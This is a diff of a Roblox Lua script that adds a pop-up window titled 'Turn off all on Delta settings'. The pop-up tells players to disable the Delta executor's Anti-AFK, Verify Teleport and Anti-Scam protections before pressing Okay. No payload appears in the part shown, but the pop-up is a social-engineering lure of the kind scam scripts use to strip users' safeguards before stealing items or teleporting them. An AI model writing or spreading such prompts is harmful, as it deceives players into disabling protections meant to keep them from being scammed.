@@ -1,6 +1,70 @@
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local rainbowSpeed = 0.5
+local playerGui = player:WaitForChild("PlayerGui")
+
+---------------------------------------------------------
+-- Script #1 : Delta Warning UI
+---------------------------------------------------------
+local screenGui1 = Instance.new("ScreenGui")
+screenGui1.Name = "DeltaWarningUI"
+screenGui1.ResetOnSpawn = false
+screenGui1.Parent = playerGui
+
+local frame1 = Instance.new("Frame")
+frame1.Size = UDim2.new(0, 400, 0, 220)
+frame1.Position = UDim2.new(0.5, -200, 0.5, -110)
+frame1.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+frame1.BorderSizePixel = 0
+frame1.Active = true
+frame1.Draggable = true
+frame1.Parent = screenGui1
+
+local corner1 = Instance.new("UICorner")
+corner1.CornerRadius = UDim.new(0, 12)
+corner1.Parent = frame1
+
+local title1 = Instance.new("TextLabel")
+title1.Size = UDim2.new(1, -20, 0, 40)
+title1.Position = UDim2.new(0, 10, 0, 10)
+title1.BackgroundTransparency = 1
+title1.Text = "⚠️ Turn off all on Delta settings ⚠️"
+title1.TextColor3 = Color3.fromRGB(255, 0, 0)
+title1.Font = Enum.Font.GothamBold
+title1.TextSize = 20
+title1.Parent = frame1
+
+local instructions1 = Instance.new("TextLabel")
+instructions1.Size = UDim2.new(1, -20, 0, 100)
+instructions1.Position = UDim2.new(0, 10, 0, 50)
+instructions1.BackgroundTransparency = 1
+instructions1.TextXAlignment = Enum.TextXAlignment.Left
+instructions1.TextYAlignment = Enum.TextYAlignment.Top
+instructions1.Text = [[
+1. Disable Anti-AFK
+2. Disable Verify Teleport
+3. Disable Anti-Scam
+
+✅ After disabling, press OK to continue.
+]]
+instructions1.TextColor3 = Color3.fromRGB(255, 255, 255)
+instructions1.Font = Enum.Font.Gotham
+instructions1.TextSize = 16
+instructions1.Parent = frame1
+
+local okayBtn = Instance.new("TextButton")
+okayBtn.Size = UDim2.new(0, 200, 0, 40)
+okayBtn.Position = UDim2.new(0.5, -100, 1, -60)
+okayBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+okayBtn.Text = "Okay"
+okayBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+okayBtn.Font = Enum.Font.GothamBold
+okayBtn.TextSize = 20
+okayBtn.Parent = frame1
+
+local btnCorner1 = Instance.new("UICorner")
+btnCorner1.CornerRadius = UDim.new(0, 8)
+btnCorner1.Parent = okayBtn
 
 -- Function to make rainbow text
 local function updateRainbowColor(textLabel)
